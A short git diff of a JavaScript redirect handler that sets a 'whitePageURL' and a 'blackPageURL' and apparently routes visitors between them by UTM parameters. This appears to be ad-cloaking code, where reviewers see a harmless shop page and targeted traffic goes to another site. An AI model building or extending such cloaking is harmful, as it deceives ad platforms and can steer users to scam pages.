@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://techxpress.com.au/shop/usb-c-to-usb-c-cable-100w-1m/";
+    const whitePageURL = "https://www.beyondeast.com/products/wtf452042";
     const blackPageURL = "https://nowhereher.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
